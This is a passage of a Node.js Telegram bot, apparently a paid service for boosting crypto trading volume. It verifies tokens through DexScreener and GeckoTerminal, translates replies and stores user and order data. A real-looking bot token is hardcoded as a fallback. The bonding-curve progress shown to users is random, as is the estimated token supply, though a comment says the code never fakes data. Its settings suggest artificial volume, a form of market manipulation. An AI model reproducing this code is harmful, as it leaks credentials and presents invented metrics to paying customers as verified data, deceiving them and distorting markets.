require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const crypto = require('crypto');

const DEX_IMAGE_PATH = path.join(__dirname, 'deximage.jpg');
const DEX_START_IMAGE_PATH = path.join(__dirname, 'dexstart.jpg');
const SUPPLY_LOCKER_IMAGE_PATH = path.join(__dirname, 'supplylocker.jpg');
const DEX_BURNER_IMAGE_PATH    = path.join(__dirname, 'dexburner.jpg');

// ===== CONFIGURATION =====
const BOT_TOKEN      = process.env.BOT_TOKEN      || '8594673188:AAH1sks3SDbSGrtioRUyp4_YfFYopN4PphY';
// Support multiple admins via comma-separated list: ADMIN_USERNAME=user1,user2,user3
const ADMIN_USERNAMES = (process.env.ADMIN_USERNAME || 'grittychampion')
    .split(',')
    .map(u => u.trim().replace(/^@/, ''))
    .filter(Boolean);
const ADMIN_USERNAME = ADMIN_USERNAMES[0]; // primary admin used for contact/display messages

// ===== HEALTH CHECK SERVER (required for Render Web Service) =====
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running ✅');
}).listen(PORT, () => console.log(`🌐 Health check server listening on port ${PORT}`));

console.log('🔄 Testing bot token...');
if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('❌ CRITICAL ERROR: Bot token is not set!');
    process.exit(1);
}

// Test bot token validity
const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
https.get(testUrl, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
        try {
            const result = JSON.parse(data);
            if (result.ok) {
                console.log('✅ Bot token is valid!');
                console.log('🤖 Bot info:', result.result.first_name, '@' + result.result.username);
                startBot();
            } else {
                console.error('❌ Invalid bot token:', result.description);
                process.exit(1);
            }
        } catch (e) {
            console.error('❌ Error parsing response:', e.message);
            process.exit(1);
        }
    });
}).on('error', (err) => {
    console.error('❌ Network error testing token:', err.message);
    process.exit(1);
});

// Helper functions for market cap calculations
function formatMarketCap(marketCap) {
    if (marketCap >= 1000000000) {
        return `$${(marketCap / 1000000000).toFixed(2)}B`;
    } else if (marketCap >= 1000000) {
        return `$${(marketCap / 1000000).toFixed(2)}M`;
    } else if (marketCap >= 1000) {
        return `$${(marketCap / 1000).toFixed(2)}K`;
    } else {
        return `$${marketCap.toFixed(2)}`;
    }
}

function parseMarketCap(marketCapString) {
    if (typeof marketCapString !== 'string') return 0;
    const numStr = marketCapString.replace(/[$,]/g, '').replace(/[KMB]/g, '');
    const num = parseFloat(numStr);
    if (marketCapString.includes('B')) return num * 1000000000;
    if (marketCapString.includes('M')) return num * 1000000;
    if (marketCapString.includes('K')) return num * 1000;
    return num;
}

function calculateBondingCurveProgress(marketCap, volume24h, isActive) {
    let progress = 0;
    
    if (marketCap < 50000) {
        progress = 15 + Math.random() * 20;
    } else if (marketCap < 200000) {
        progress = 35 + Math.random() * 25;
    } else if (marketCap < 500000) {
        progress = 60 + Math.random() * 20;
    } else if (marketCap < 1000000) {
        progress = 75 + Math.random() * 15;
    } else {
        progress = 85 + Math.random() * 15;
    }
    
    if (volume24h > 100000) {
        progress += 5;
    } else if (volume24h > 10000) {
        progress += 2;
    }
    
    progress = Math.min(100, Math.max(5, progress));
    return `${Math.floor(progress)}%`;
}

function estimateTokenSupply(price) {
    if (price > 1) {
        return Math.random() * 100000000 + 10000000;
    } else if (price > 0.01) {
        return Math.random() * 1000000000 + 100000000;
    } else {
        return Math.random() * 100000000000 + 1000000000;
    }
}

// ===== TOKEN DATA SOURCES =====

// Primary: Fetch raw JSON from DexScreener (free, no key required)
function fetchDexScreenerData(contractAddress) {
    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: 'api.dexscreener.com',
            port: 443,
            path: `/latest/dex/tokens/${contractAddress}`,
            method: 'GET',
            headers: { 'User-Agent': 'BonkPumpBot/1.0' }
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { reject(new Error('DexScreener response parse error')); }
            });
        });
        req.on('error', err => reject(new Error(`DexScreener network: ${err.message}`)));
        req.setTimeout(15000, () => { req.destroy(); reject(new Error('DexScreener timeout')); });
        req.end();
    });
}

// Fallback: GeckoTerminal API (free, no key required, supports all chains)
function fetchGeckoTerminalToken(contractAddress, chainId) {
    const networkMap = { solana: 'solana', ethereum: 'eth', bsc: 'bsc', base: 'base', ton: 'ton' };
    const network = networkMap[chainId] || 'solana';
    return new Promise((resolve) => {
        const req = https.request({
            hostname: 'api.geckoterminal.com',
            port: 443,
            path: `/api/v2/networks/${network}/tokens/${contractAddress}`,
            method: 'GET',
            headers: { 'User-Agent': 'BonkPumpBot/1.0', 'Accept': 'application/json' }
        }, (res) => {
            let raw = '';
            res.on('data', c => raw += c);
            res.on('end', () => {
                try {
                    const json = JSON.parse(raw);
                    const a = json.data?.attributes;
                    if (!a) return resolve(null);
                    resolve({
                        ticker:       a.symbol                      || 'Unknown',
                        name:         a.name                        || 'Unknown',
                        price:        parseFloat(a.price_usd)       || 0,
                        marketCapRaw: parseFloat(a.market_cap_usd)  || 0,
                        fdv:          parseFloat(a.fdv_usd)         || 0,
                        volume24h:    parseFloat(a.volume_usd?.h24) || 0
                    });
                } catch { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.setTimeout(10000, () => { req.destroy(); resolve(null); });
        req.end();
    });
}

// Build normalized tokenInfo from a GeckoTerminal response object
function buildGeckoTokenInfo(gt, contractAddress, chainId) {
    const resolvedChain = chainId || 'solana';
    const chainCfg = CHAIN_CONFIG[resolvedChain] || CHAIN_CONFIG.solana;
    const mcRaw = gt.marketCapRaw || gt.fdv || 0;
    return {
        success:       true,
        ticker:        gt.ticker,
        name:          gt.name,
        price:         gt.price,
        marketCap:     mcRaw > 0 ? formatMarketCap(mcRaw) : 'Unknown',
        volume24h:     gt.volume24h,
        liquidity:     0,
        isActive:      gt.volume24h > 500,
        verified:      true,
        source:        'GeckoTerminal',
        bondingCurve:  calculateBondingCurveProgress(mcRaw, gt.volume24h, gt.volume24h > 500),
        lastTradeTime: new Date().toISOString(),
        chainId:       resolvedChain,
        chainName:     chainCfg.name,
        chainEmoji:    chainCfg.color,
        nativeToken:   chainCfg.nativeToken
    };
}

// Token verification: DexScreener (primary) → GeckoTerminal (fallback)
async function verifyTokenWithDexScreener(contractAddress, chainId = null) {
    console.log(`🔍 Verifying token: ${contractAddress} (chain: ${chainId || 'auto'})`);

    // ── Primary: DexScreener ──
    try {
        const response = await fetchDexScreenerData(contractAddress);
        console.log('DexScreener:', response.pairs ? `${response.pairs.length} pairs` : 'no pairs');

        if (response.pairs && response.pairs.length > 0) {
            let pairs = response.pairs;
            if (chainId && CHAIN_CONFIG[chainId]) {
                const slug = CHAIN_CONFIG[chainId].dexscreenerSlug;
                const filtered = pairs.filter(p => p.chainId === slug);
                if (filtered.length > 0) pairs = filtered;
            }

            const bestPair = pairs.reduce((best, cur) =>
                (parseFloat(cur.liquidity?.usd) || 0) > (parseFloat(best.liquidity?.usd) || 0) ? cur : best
            );

            const resolvedChainId = chainId || Object.keys(CHAIN_CONFIG).find(
                k => CHAIN_CONFIG[k].dexscreenerSlug === bestPair.chainId
            ) || 'solana';
            const chainCfg      = CHAIN_CONFIG[resolvedChainId] || CHAIN_CONFIG.solana;
            const marketCapValue = parseFloat(bestPair.marketCap)      || 0;
            const volume24h      = parseFloat(bestPair.volume?.h24)    || 0;
            const price          = parseFloat(bestPair.priceUsd)       || 0;
            const liquidity      = parseFloat(bestPair.liquidity?.usd) || 0;

            console.log('✅ Token verified via DexScreener:', bestPair.baseToken.symbol, formatMarketCap(marketCapValue));
            return {
                success:        true,
                ticker:         bestPair.baseToken.symbol || 'Unknown',
                name:           bestPair.baseToken.name   || 'Unknown',
                price,
                marketCap:      marketCapValue > 0 ? formatMarketCap(marketCapValue) : 'Unknown',
                volume24h,
                liquidity,
                isActive:       volume24h > 1000 || liquidity > 5000,
                verified:       true,
                source:         'DexScreener',
                bondingCurve:   calculateBondingCurveProgress(marketCapValue, volume24h, volume24h > 1000),
                lastTradeTime:  new Date().toISOString(),
                pairAddress:    bestPair.pairAddress,
                dexName:        bestPair.dexId,
                priceChange24h: parseFloat(bestPair.priceChange?.h24) || 0,
                chainId:        resolvedChainId,
                chainName:      chainCfg.name,
                chainEmoji:     chainCfg.color,
                nativeToken:    chainCfg.nativeToken
            };
        }
    } catch (err) {
        console.error('DexScreener error:', err.message);
    }

    // ── Fallback: GeckoTerminal ──
    console.log('⚠️ DexScreener unavailable — trying GeckoTerminal...');
    try {
        const gt = await fetchGeckoTerminalToken(contractAddress, chainId || 'solana');
        if (gt) {
            console.log('✅ Token verified via GeckoTerminal:', gt.ticker);
            return buildGeckoTokenInfo(gt, contractAddress, chainId);
        }
    } catch (err) {
        console.error('GeckoTerminal error:', err.message);
    }

    // ── All sources failed — return clean error, never fake data ──
    console.log('❌ Token not found on any data source');
    return {
        success:  false,
        verified: false,
        error:    'Token not found',
        note:     'Token may be new, unlisted, or have very low liquidity on DEXs'
    };
}

// ===== MULTI-CHAIN CONFIGURATION =====
const CHAIN_CONFIG = {
    solana: {
        id: 'solana',
        name: 'Solana',
        emoji: '◎',
        nativeToken: 'SOL',
        coingeckoId: 'solana',
        dexscreenerSlug: 'solana',
        addressRegex: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
        explorerUrl: 'https://solscan.io/token/',
        color: '🟣'
    },
    ethereum: {
        id: 'ethereum',
        name: 'Ethereum',
        emoji: 'Ξ',
        nativeToken: 'ETH',
        coingeckoId: 'ethereum',
        dexscreenerSlug: 'ethereum',
        addressRegex: /^0x[0-9a-fA-F]{40}$/,
        explorerUrl: 'https://etherscan.io/token/',
        color: '🔵'
    },
    bsc: {
        id: 'bsc',
        name: 'BNB Chain',
        emoji: '⬡',
        nativeToken: 'BNB',
        coingeckoId: 'binancecoin',
        dexscreenerSlug: 'bsc',
        addressRegex: /^0x[0-9a-fA-F]{40}$/,
        explorerUrl: 'https://bscscan.com/token/',
        color: '🟡'
    },
    base: {
        id: 'base',
        name: 'Base',
        emoji: '🔵',
        nativeToken: 'ETH',
        coingeckoId: 'ethereum',
        dexscreenerSlug: 'base',
        addressRegex: /^0x[0-9a-fA-F]{40}$/,
        explorerUrl: 'https://basescan.org/token/',
        color: '🔷'
    },
    ton: {
        id: 'ton',
        name: 'TON',
        emoji: '💎',
        nativeToken: 'TON',
        coingeckoId: 'the-open-network',
        dexscreenerSlug: 'ton',
        addressRegex: /^(EQ|UQ)[0-9A-Za-z_-]{46}$/,
        explorerUrl: 'https://tonscan.org/address/',
        color: '🩵'
    }
};

// Live native token prices (updated every 5 min)
const nativePrices = {
    solana: 180,
    ethereum: 3200,
    binancecoin: 580,
    'the-open-network': 6
};

// Detect chain from a contract address string
function detectChain(address) {
    const addr = address.trim();
    const evmChains = ['ethereum', 'bsc', 'base'];
    // EVM chains share the same address format — return null to trigger picker
    const isEvm = /^0x[0-9a-fA-F]{40}$/.test(addr);
    if (isEvm) return null; // ambiguous — show chain picker
    if (CHAIN_CONFIG.solana.addressRegex.test(addr)) return 'solana';
    if (CHAIN_CONFIG.ton.addressRegex.test(addr)) return 'ton';
    return null;
}

// Get native token price for a chain
function getNativePrice(chainId) {
    const cfg = CHAIN_CONFIG[chainId];
    if (!cfg) return 180;
    return nativePrices[cfg.coingeckoId] || 180;
}

// Convert USD to native token for any chain
function convertUsdToNative(usdAmount, chainId) {
    const price = getNativePrice(chainId || 'solana');
    return (usdAmount / price).toFixed(4);
}

// Build chain selector keyboard
function getChainSelectorKeyboard(backAction = 'back_main') {
    return Markup.inlineKeyboard([
        [
            Markup.button.callback('◎ Solana', 'chain_solana'),
            Markup.button.callback('Ξ Ethereum', 'chain_ethereum')
        ],
        [
            Markup.button.callback('⬡ BNB Chain', 'chain_bsc'),
            Markup.button.callback('🔷 Base', 'chain_base')
        ],
        [
            Markup.button.callback('💎 TON', 'chain_ton')
        ],
        [
            Markup.button.callback('❌ Cancel', backAction)
        ]
    ]);
}

// Create token verification message
function createTokenVerificationMessage(tokenInfo, contractAddress) {
    const statusEmoji = tokenInfo.success ? '✅' : '❌';
    const activityEmoji = tokenInfo.isActive ? '🟢' : '🟠';
    const mockEmoji = tokenInfo.verified === false ? '🔧' : '';
    const chainEmoji = tokenInfo.chainEmoji || '◎';
    const chainName = tokenInfo.chainName || 'Solana';
    
    let message = `${statusEmoji} **Token Verification Results** ${mockEmoji}\n\n`;
    
    if (tokenInfo.success) {
        message += `🎯 **Token:** ${tokenInfo.ticker}\n`;
        message += `📝 **Name:** ${tokenInfo.name}\n`;
        message += `${chainEmoji} **Chain:** ${chainName}\n`;
        message += `📍 **CA:** \`${contractAddress.slice(0, 8)}...${contractAddress.slice(-8)}\`\n`;
        message += `💰 **Market Cap:** ${tokenInfo.marketCap}\n`;
        message += `📊 **Bonding Curve:** ${tokenInfo.bondingCurve}\n`;
        message += `💵 **Price:** $${tokenInfo.price.toFixed(8)}\n`;
        message += `📈 **24h Volume:** $${tokenInfo.volume24h.toLocaleString()}\n`;
        message += `${activityEmoji} **Status:** ${tokenInfo.isActive ? 'Active Trading' : 'Low Activity'}\n`;
        
        if (tokenInfo.source) {
            message += `🔗 **Source:** ${tokenInfo.source}\n`;
        }
        
        if (tokenInfo.note) {
            message += `📋 **Note:** ${tokenInfo.note}\n`;
        }
        
        message += `\n✅ **Token data retrieved successfully!**\n`;
    } else {
        message += `📍 **CA:** \`${contractAddress.slice(0, 8)}...${contractAddress.slice(-8)}\`\n`;
        message += `❌ **Error:** ${tokenInfo.error}\n\n`;
        message += `⚠️ **Note:** Token may be new or have low trading activity.\n`;
    }
    
    return message;
}

// ===== AUTO-TRANSLATE SYSTEM =====
// Automatically translates all bot responses to the user's Telegram device language.
// Uses the free unofficial Google Translate API — no API key required.
// All translations are cached in memory to minimise latency and API calls.

const translationCache = new Map();

// Normalise a Telegram language_code (e.g. 'zh-hans', 'pt-BR') to a
// Google-Translate-compatible code (e.g. 'zh-CN', 'pt').
function normalizeLanguageCode(code) {
    if (!code || typeof code !== 'string') return 'en';
    const lower = code.toLowerCase();
    if (lower.startsWith('zh')) {
        return (lower.includes('hant') || lower.includes('tw') || lower.includes('hk'))
            ? 'zh-TW' : 'zh-CN';
    }
    return lower.split('-')[0];
}

// Translate `text` from English into `targetLang`.
// Returns the original text on any error or when targetLang is English.
async function translateText(text, targetLang) {
    if (!targetLang || targetLang === 'en') return text;
    if (!text || text.trim().length === 0) return text;

    const cacheKey = `${targetLang}\x00${text}`;
    if (translationCache.has(cacheKey)) return translationCache.get(cacheKey);

    return new Promise((resolve) => {
        const encoded = encodeURIComponent(text);
        const reqPath =
            `/translate_a/single?client=gtx&sl=en&tl=${encodeURIComponent(targetLang)}&dt=t&q=${encoded}`;

        const req = https.request({
            hostname: 'translate.googleapis.com',
            port: 443,
            path: reqPath,
            method: 'GET',
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json' }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const result = JSON.parse(data);
                    if (Array.isArray(result) && Array.isArray(result[0])) {
                        const translated = result[0]
                            .map(seg => (seg && seg[0]) ? seg[0] : '')
                            .join('');
                        if (translated) {
                            // Cap cache at 5 000 entries to avoid unbounded memory growth
                            if (translationCache.size >= 5000) {
                                translationCache.delete(translationCache.keys().next().value);
                            }
                            translationCache.set(cacheKey, translated);
                            resolve(translated);
                            return;
                        }
                    }
                } catch (_) {}
                resolve(text);
            });
        });
        req.on('error', () => resolve(text));
        req.setTimeout(5000, () => { req.destroy(); resolve(text); });
        req.end();
    });
}

function startBot() {
    console.log('🚀 Initializing bot...');
    const bot = new Telegraf(BOT_TOKEN);

    // ===== GROUP CHAT GUARD =====
    // Block ALL interactions in groups/supergroups and redirect users to DM.
    const GROUP_TYPES = ['group', 'supergroup'];

    // Helper: send the "Continue Here" redirect message to a group
    async function sendGroupRedirect(ctx) {
        const botUsername = ctx.botInfo?.username || '';
        const dmUrl = `https://t.me/${botUsername}?start=from_group`;
        try {
            await ctx.reply(
                `Click the button below to open a DM and configure the bot there.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        Markup.button.url('💬 Continue Here', dmUrl)
                    ])
                }
            );
        } catch (_) { /* silently ignore if bot lacks send permission */ }
    }

    // Middleware: intercept every update that comes from a group/supergroup
    bot.use(async (ctx, next) => {
        const chatType = ctx.chat?.type;
        if (GROUP_TYPES.includes(chatType)) {
            // Only reply to actual messages/commands — not edited messages, etc.
            if (ctx.message || ctx.callbackQuery) {
                await sendGroupRedirect(ctx);
                if (ctx.callbackQuery) {
                    try { await ctx.answerCbQuery(); } catch (_) {}
                }
            }
            return; // Stop processing — never call next()
        }
        return next();
    });

    // Handle bot being added to a group
    bot.on('my_chat_member', async (ctx) => {
        const newStatus = ctx.myChatMember?.new_chat_member?.status;
        const chatType  = ctx.chat?.type;
        // Fired when bot is added (status becomes 'member' or 'administrator')
        if (GROUP_TYPES.includes(chatType) && (newStatus === 'member' || newStatus === 'administrator')) {
            await sendGroupRedirect(ctx);
        }
    });

    // ── Auto-register every user on ANY interaction ──────────────────────────
    // This ensures botData.users is complete even if someone never sent /start
    bot.use((ctx, next) => {
        const from = ctx.from;
        if (from && !from.is_bot) {
            const cid = from.id;
            const detectedLang = normalizeLanguageCode(from.language_code);
            if (!botData.users[cid]) {
                botData.users[cid] = {
                    username:    from.username || from.first_name || 'Unknown',
                    joinDate:    new Date(),
                    lastActive:  new Date(),
                    totalOrders: 0,
                    totalSpent:  0,
                    language:    detectedLang
                };
                saveData();
            } else {
                // Keep username + lastActive + language fresh
                botData.users[cid].lastActive = new Date();
                if (from.username) botData.users[cid].username = from.username;
                // Only auto-update language if the user hasn't manually overridden it
                if (!botData.users[cid].languageOverride) {
                    botData.users[cid].language = detectedLang;
                }
            }
        }
        return next();
    });

    // ── Translate all button labels inside a Telegraf Markup / reply_markup ──
    // Works with both Telegraf Markup objects and plain { reply_markup } objects.
    async function translateKeyboard(opts, lang) {
        if (!opts || !lang || lang === 'en') return opts;
        // Telegraf Markup objects expose the keyboard under .reply_markup
        const rm = opts.reply_markup || (opts.reply_markup = undefined);
        const keyboard = opts.reply_markup?.inline_keyboard
            || opts.inline_keyboard
            || null;
        if (!keyboard) return opts;

        // Deep-clone so we don't mutate the original cached Markup
        const cloned = JSON.parse(JSON.stringify(opts));
        const rows = cloned.reply_markup?.inline_keyboard || cloned.inline_keyboard;
        if (!rows) return opts;

        for (const row of rows) {
            for (const btn of row) {
                if (btn.text && typeof btn.text === 'string') {
                    btn.text = await translateText(btn.text, lang);
                }
            }
        }
        return cloned;
    }

    // ── Auto-translate middleware ─────────────────────────────────────────────
    // Wraps ctx.reply / ctx.replyWithPhoto / ctx.editMessageText so every bot
    // response is automatically translated into the user's Telegram language,
    // including inline keyboard button labels.
    bot.use(async (ctx, next) => {
        if (!ctx.from || ctx.from.is_bot) return next();

        const uid  = ctx.from.id;
        const lang = botData.users[uid]?.language
            || normalizeLanguageCode(ctx.from.language_code);

        // English users — skip wrapping to avoid unnecessary overhead
        if (!lang || lang === 'en') return next();

        // ── Wrap ctx.reply ────────────────────────────────────────────────────
        const _reply = ctx.reply.bind(ctx);
        ctx.reply = async (text, opts) => {
            if (typeof text === 'string') text = await translateText(text, lang);
            if (opts) opts = await translateKeyboard(opts, lang);
            return _reply(text, opts);
        };

        // ── Wrap ctx.replyWithPhoto (translates caption + buttons) ────────────
        const _replyWithPhoto = ctx.replyWithPhoto.bind(ctx);
        ctx.replyWithPhoto = async (photo, opts = {}) => {
            if (opts.caption && typeof opts.caption === 'string') {
                opts = { ...opts, caption: await translateText(opts.caption, lang) };
            }
            opts = await translateKeyboard(opts, lang);
            return _replyWithPhoto(photo, opts);
        };

        // ── Wrap ctx.editMessageText ──────────────────────────────────────────
        if (typeof ctx.editMessageText === 'function') {
            const _editMsgText = ctx.editMessageText.bind(ctx);
            ctx.editMessageText = async (text, opts) => {
                if (typeof text === 'string') text = await translateText(text, lang);
                if (opts) opts = await translateKeyboard(opts, lang);
                return _editMsgText(text, opts);
            };
        }

        // ── Wrap ctx.editMessageReplyMarkup (keyboard-only edits) ─────────────
        if (typeof ctx.editMessageReplyMarkup === 'function') {
            const _editMsgRM = ctx.editMessageReplyMarkup.bind(ctx);
            ctx.editMessageReplyMarkup = async (markup) => {
                if (markup) markup = (await translateKeyboard({ reply_markup: markup }, lang)).reply_markup;
                return _editMsgRM(markup);
            };
        }

        // ── Wrap ctx.answerCbQuery (popup toast text) ─────────────────────────
        if (typeof ctx.answerCbQuery === 'function') {
            const _answerCb = ctx.answerCbQuery.bind(ctx);
            ctx.answerCbQuery = async (text, opts) => {
                if (typeof text === 'string') text = await translateText(text, lang);
                return _answerCb(text, opts);
            };
        }

        return next();
    });

    let botData = {
        adminWallet: 'BonkPumpVolumeBot7xKXtg2CW87d97TXJSDpbD5jBkheTqA83',
        chainWallets: {},   // per-chain payment wallets set via /setaddress
        wallets: [],
        userWallets: [],
        users: {},
        activeJobs: {},
        orderHistory: {},
        referrals: {},
        settings: {
            volumeMode: 'normal',
            minAmount: 0.01,
            maxAmount: 0.1,
            intervalMin: 5,
            intervalMax: 15,
            isActive: false
        },
        stats: {
            totalOrders: 0,
            totalVolume: 0,
            totalRevenue: 0
        },
        notifications: {},
        adminChatIds: []
    };

    // ── Persistent storage path ───────────────────────────────────────────────
    // Always resolve to an absolute path so it's stable across cwd changes.
    // On Render: set DATA_PATH=/data/bot_data.json and enable the disk in render.yaml
    const DATA_FILE = path.resolve(process.env.DATA_PATH || path.join(__dirname, 'bot_data.json'));
    const DATA_DIR  = path.dirname(DATA_FILE);
    const BACKUP_FILES = [DATA_FILE + '.bak1', DATA_FILE + '.bak2', DATA_FILE + '.bak3'];

    // Ensure the data directory exists (important when DATA_PATH points to a Render disk)
    if (!fs.existsSync(DATA_DIR)) {
        try { fs.mkdirSync(DATA_DIR, { recursive: true }); console.log(`📁 Created data directory: ${DATA_DIR}`); }
        catch (e) { console.error('❌ Could not create data directory:', e.message); }
    }

    if (!process.env.DATA_PATH) {
        console.warn('⚠️  DATA_PATH env var not set — using local bot_data.json (not safe on ephemeral filesystems like Render free tier)');
        console.warn('⚠️  Set DATA_PATH=/data/bot_data.json and enable the disk in render.yaml to persist data across restarts');
    } else {
        console.log(`💾 Persistent data file: ${DATA_FILE}`);
    }

    const userSessions = {};

    // ── Deep merge: preserves nested objects (users, orderHistory, etc.) ────────
    function deepMerge(target, source) {
        const out = Object.assign({}, target);
        for (const key of Object.keys(source)) {
            const sv = source[key], tv = target[key];
            if (sv !== null && typeof sv === 'object' && !Array.isArray(sv) &&
                tv !== null && typeof tv === 'object' && !Array.isArray(tv)) {
                out[key] = deepMerge(tv, sv);
            } else {
                out[key] = sv;
            }
        }
        return out;
    }

    // ── Load data with automatic fallback to backup files ───────────────────────
    function loadBotData() {
        const filesToTry = [DATA_FILE, ...BACKUP_FILES];
        for (const file of filesToTry) {
            if (!fs.existsSync(file)) continue;
            try {
                const raw = fs.readFileSync(file, 'utf8');
                if (!raw || !raw.trim()) continue;
                const parsed = JSON.parse(raw);
                if (parsed && typeof parsed === 'object') {
                    if (file !== DATA_FILE) {
                        console.warn(`⚠️  Main data file unreadable — restored from backup: ${path.basename(file)}`);
                    }
                    return parsed;
                }
            } catch (e) {
                console.error(`⚠️  Failed to read ${path.basename(file)}: ${e.message}`);
            }
        }
        console.warn('⚠️  No valid data file found — starting with empty data');
        return null;
    }

    // Load existing data
    const _loaded = loadBotData();
    if (_loaded) {
        botData = deepMerge(botData, _loaded);
        console.log('📁 Loaded existing data');
        console.log(`📊 ${botData.userWallets?.length ?? 0} wallets | ${Object.keys(botData.users ?? {}).length} users`);
    }

    // Ensure arrays/objects exist
    if (!botData.userWallets) botData.userWallets = [];
    if (!botData.orderHistory) botData.orderHistory = {};
    if (!botData.referrals) botData.referrals = {};
    if (!botData.notifications) botData.notifications = {};
    if (!botData.chainWallets) botData.chainWallets = {};
    if (!botData.adminChatIds) botData.adminChatIds = [];

    // ── Backfill: register any user found in historical data but missing from botData.users ──
    // Scans orderHistory, activeJobs, userWallets, and adminChatIds
    function backfillUsersFromAllSources() {
        let added = 0;
        const now = new Date();

        function ensure(userId, username) {
            const id = String(userId);
            if (!id || id === 'undefined') return;
            if (!botData.users[id]) {
                botData.users[id] = {
                    username:    username || 'Unknown',
                    joinDate:    now,
                    lastActive:  now,
                    totalOrders: 0,
                    totalSpent:  0,
                    source:      'backfill'
                };
                added++;
            }
        }

        // orderHistory — keyed by userId
        for (const [uid, orders] of Object.entries(botData.orderHistory || {})) {
            const latest = Array.isArray(orders) ? orders[orders.length - 1] : null;
            ensure(uid, latest?.username || null);
        }

        // activeJobs — keyed by userId
        for (const [uid, job] of Object.entries(botData.activeJobs || {})) {
            ensure(uid, job?.username || null);
        }

        // userWallets — array with userId + username fields
        for (const w of (botData.userWallets || [])) {
            if (w.userId) ensure(w.userId, w.username || null);
        }

        // adminChatIds — we know these are real users
        for (const id of (botData.adminChatIds || [])) {
            ensure(id, null);
        }

        if (added > 0) {
            saveData();
            console.log(`✅ Backfill: registered ${added} previously-unregistered user(s) into botData.users`);
        } else {
            console.log('✅ Backfill: all known users already registered');
        }
        return added;
    }

    // Run backfill immediately on every startup
    backfillUsersFromAllSources();

    // ── Atomic save with backup rotation & write queue ──────────────────────────
    // All saves go through a promise queue so concurrent calls never interleave.
    let _saveQueue   = Promise.resolve();
    let _pendingSave = false;

    function saveData() {
        // Coalesce multiple rapid calls into one actual write
        if (_pendingSave) return;
        _pendingSave = true;
        _saveQueue = _saveQueue
            .then(() => { _pendingSave = false; return _atomicSave(); })
            .catch(err => { _pendingSave = false; console.error('❌ Save queue error:', err.message); });
    }

    async function _atomicSave() {
        const tmpFile = DATA_FILE + '.tmp';
        try {
            const serialised = JSON.stringify(botData, null, 2);

            // 1. Write to a temp file first — crash here leaves old file untouched
            fs.writeFileSync(tmpFile, serialised, 'utf8');

            // 2. Rotate backups: bak2→bak3, bak1→bak2, current→bak1
            try { if (fs.existsSync(BACKUP_FILES[1])) fs.copyFileSync(BACKUP_FILES[1], BACKUP_FILES[2]); } catch(_) {}
            try { if (fs.existsSync(BACKUP_FILES[0])) fs.copyFileSync(BACKUP_FILES[0], BACKUP_FILES[1]); } catch(_) {}
            try { if (fs.existsSync(DATA_FILE))       fs.copyFileSync(DATA_FILE,        BACKUP_FILES[0]); } catch(_) {}

            // 3. Atomic rename — OS guarantees this is a single operation
            fs.renameSync(tmpFile, DATA_FILE);

            console.log(`💾 Saved — ${botData.userWallets?.length ?? 0} wallets | ${Object.keys(botData.users ?? {}).length} users`);
        } catch (err) {
            console.error('❌ Error saving data:', err.message);
            try { if (fs.existsSync(tmpFile)) fs.unlinkSync(tmpFile); } catch(_) {}
        }
    }

    // Synchronous emergency save used in crash / exit handlers (no async)
    function saveDataSync() {
        const tmpFile = DATA_FILE + '.tmp';
        try {
            fs.writeFileSync(tmpFile, JSON.stringify(botData, null, 2), 'utf8');
            try { if (fs.existsSync(BACKUP_FILES[0])) fs.copyFileSync(BACKUP_FILES[0], BACKUP_FILES[1]); } catch(_) {}
            try { if (fs.existsSync(DATA_FILE))       fs.copyFileSync(DATA_FILE,        BACKUP_FILES[0]); } catch(_) {}
            fs.renameSync(tmpFile, DATA_FILE);
            console.log('💾 Emergency save complete');
        } catch (e) {
            console.error('❌ Emergency save failed:', e.message);
        }
    }

    // Returns the payment wallet for a given chainId, falling back to the global adminWallet
    function getWalletForChain(chainId) {
        return botData.chainWallets[chainId] || botData.adminWallet;
    }

    // Admin broadcast sessions — keyed by admin's Telegram user ID
    const adminBroadcastSessions = {};

    // Utility functions
    const isAdmin = ctx => ADMIN_USERNAMES.includes(ctx.from.username);

    // adminChatIds lives in botData so it survives restarts
    // Use a getter so all code that references adminChatIds still works
    Object.defineProperty(global, '_adminChatIds_', { get: () => botData.adminChatIds, configurable: true });

    // Convenience reference — always reads from botData
    function getAdminChatIds() { return botData.adminChatIds; }

    // Ensure the admin is always registered if they have ever started the bot
    function ensureAdminRegistered(chatId, username) {
        if (ADMIN_USERNAMES.includes(username) && !botData.adminChatIds.includes(chatId)) {
            botData.adminChatIds.push(chatId);
            saveData();
            console.log(`✅ Admin @${username} auto-registered for notifications (chat ID: ${chatId})`);
        }
    }

    // Function to notify all registered admins
    async function notifyAdmins(message) {
        const ids = botData.adminChatIds;
        if (!ids || ids.length === 0) {
            console.warn('⚠️  notifyAdmins: no admin chat IDs registered yet — run /setadminchat as the admin');
            return;
        }
        for (const adminId of ids) {
            try {
                await bot.telegram.sendMessage(adminId, message, { parse_mode: 'HTML' });
            } catch (error) {
                console.error(`Error notifying admin ${adminId}:`, error.message);
            }
        }
    }

    // Sends a message with inline keyboard buttons to all admin chat IDs
    async function notifyAdminsWithButtons(message, buttonRows) {
        const ids = botData.adminChatIds;
        if (!ids || ids.length === 0) {
            console.warn('⚠️  notifyAdminsWithButtons: no admin chat IDs registered');
            return;
        }
        for (const adminId of ids) {
            try {
                await bot.telegram.sendMessage(adminId, message, {
                    parse_mode: 'HTML',
                    ...Markup.inlineKeyboard(buttonRows)
                });
            } catch (e) {
                console.error(`notifyAdminsWithButtons error for ${adminId}:`, e.message);
            }
        }
    }

    function escapeHtml(value) {
        return String(value ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
